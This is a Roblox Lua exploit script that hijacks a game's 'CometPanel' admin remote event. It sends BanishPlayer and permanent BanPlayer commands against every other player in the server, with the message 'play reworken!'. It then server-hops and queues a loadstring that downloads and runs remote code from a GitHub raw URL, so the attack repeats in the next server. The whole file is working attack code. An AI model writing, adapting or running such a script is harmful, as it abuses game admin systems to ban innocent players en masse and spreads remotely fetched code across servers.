print("reworken teleporter initialized..")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local placeId = game.PlaceId
local currentJobId = game.JobId

local LocalPlayer

repeat
    LocalPlayer = Players.LocalPlayer
    task.wait(0.1)
until LocalPlayer

print("hacking into cometpanel..")
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local CometPanel
repeat
    CometPanel = PlayerGui:FindFirstChild("CometPanel")
    if not CometPanel then
        task.wait(0.5)
    end
until CometPanel

local Assets = CometPanel:WaitForChild("Assets")
local Utility = Assets:WaitForChild("Utility")
local Event = game:GetService("ReplicatedStorage").Modules.Network.Network.RemoteEvent
local utility = require(Utility)

print("sending banish request...")

local TargetPlayers = {}

for _, player in ipairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        table.insert(TargetPlayers, player)
    end
end

Event:FireServer(
    "Starman",
    {
        Players = TargetPlayers,
        GameID = "125328885809247",
        CommandName = "BanishPlayer"
    }
)

for _, player in ipairs(TargetPlayers) do
    print("Processing player:", player.Name)

    Event:FireServer(
        "ExecuteCommand",
        "BanPlayer",
        player.Name,
        player.Name,
        "play reworken!",
        "FOREVER",
        ""
    )
end

task.wait(30)

print("server hopping...")

local success, result = pcall(function()
    return game:HttpGet(
        "https://games.roblox.com/v1/games/" .. placeId ..
        "/servers/Public?sortOrder=Asc&limit=100"
    )
end)

if success then
    local data = HttpService:JSONDecode(result)
    local servers = {}

    for _, server in ipairs(data.data) do
        if server.id ~= currentJobId and server.playing < server.maxPlayers then
            table.insert(servers, server.id)
        end
    end

    if #servers > 0 then
        local serverId = servers[math.random(1, #servers)]

        if typeof(queue_on_teleport) == "function" then
            queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/viomod/comet/refs/heads/main/main.lua'))()")
        elseif typeof(queueonteleport) == "function" then
            queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/viomod/comet/refs/heads/main/main.lua'))()")
        end

        TeleportService:TeleportToPlaceInstance(placeId, serverId, Players.LocalPlayer)
    end
end
